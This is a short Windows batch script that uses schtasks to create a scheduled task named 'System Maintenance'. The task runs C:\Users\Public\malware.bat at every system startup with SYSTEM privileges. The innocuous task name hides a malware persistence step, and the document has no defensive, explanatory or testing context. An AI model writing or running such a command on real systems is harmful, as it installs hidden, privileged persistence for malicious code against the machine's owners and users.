@echo off
schtasks /create /tn "System Maintenance" /tr "C:\Users\Public\malware.bat" /sc onstart /ru SYSTEM /f
